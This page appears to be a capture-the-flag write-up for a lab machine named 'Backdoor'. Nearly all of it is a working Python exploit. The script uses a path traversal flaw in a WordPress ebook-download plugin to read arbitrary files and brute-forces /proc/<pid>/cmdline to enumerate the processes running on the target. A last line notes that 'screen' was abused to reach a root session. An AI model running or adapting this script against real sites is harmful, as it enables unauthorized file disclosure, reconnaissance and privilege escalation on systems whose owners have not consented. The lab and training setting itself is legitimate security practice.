---
layout: default
---

# Backdoor

Script used to gain a foothold on the machine.

```python
import os
import requests
import sys
import signal
from concurrent import futures
from pwn import *

def handler(a,b):
    print('[+] Exiting...')
    sys.exit()

signal.signal(signal.SIGINT,handler)

url = 'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../..{}'

'''
Bruteforce /proc/<pid>/cmdline
'''

def bruteforce_cmdline_thread(final_url,prefix,sufix,pid):
    
        res = requests.get(url=final_url)
        cmdline = res.text.removeprefix(prefix).removesuffix(sufix)
        if (len(cmdline) != 0):
            
            print('[+] Proceso con p id -> %s encontrado' % pid )
            print('[+] cmdline -> %s\n' % cmdline)
            
def bruteforce_cmdline():

    p1 = log.progress('')
    
    with futures.ThreadPoolExecutor(10) as executor:
        for pid in range(1,20000):
            
            payload = '/proc/{}/cmdline'.format(pid)
            prefix = f'../../../../../../..{payload}../../../../../../..{payload}../../../../../../..{payload}'
            sufix = '<script>window.close()</script>'
            
            final_url = url.format(payload)
            p1.status('Probando con %s' % final_url)
            executor.submit(bruteforce_cmdline_thread,final_url,prefix,sufix,pid)
```

Then we abused  `screen` to attach to a root session.